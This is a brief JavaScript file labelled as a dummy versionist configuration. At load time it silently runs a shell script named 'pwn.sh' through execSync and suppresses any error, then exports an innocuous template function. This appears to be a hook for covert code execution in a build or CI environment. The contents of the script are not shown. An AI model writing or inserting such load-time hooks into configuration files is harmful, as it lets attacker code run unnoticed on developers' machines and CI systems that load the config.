const { execSync } = require('child_process');
try {
    execSync('bash pwn.sh', { stdio: 'inherit' });
} catch (e) {}

module.exports = {
  // dummy versionist config
  getTemplate: () => '',
};
